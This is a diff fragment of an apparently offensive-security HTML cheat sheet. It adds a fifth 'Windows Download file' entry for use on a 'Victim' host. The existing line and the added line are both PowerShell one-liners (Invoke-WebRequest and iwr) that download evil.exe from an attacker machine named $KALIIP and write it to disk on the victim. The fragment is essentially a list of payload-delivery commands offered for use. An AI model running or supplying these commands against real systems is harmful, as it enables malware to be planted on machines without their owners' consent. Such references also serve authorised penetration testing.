@@ -420,6 +420,9 @@ rpcclient $> exit
 <p id="info">Windows Download file #4</p>
 <h4>Victim</h4>
 <p id="codebox">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Invoke-WebRequest -OutFile evil.exe -Uri http://$KALIIP/evil.exe </p>
+<p id="info">Windows Download file #5</p>
+<h4>Victim</h4>
+<p id="codebox">powershell.exe -c "iwr http://$KALIIP/evil.exe -OutFile C:\temp\evil.exe" </p>
 
 
 
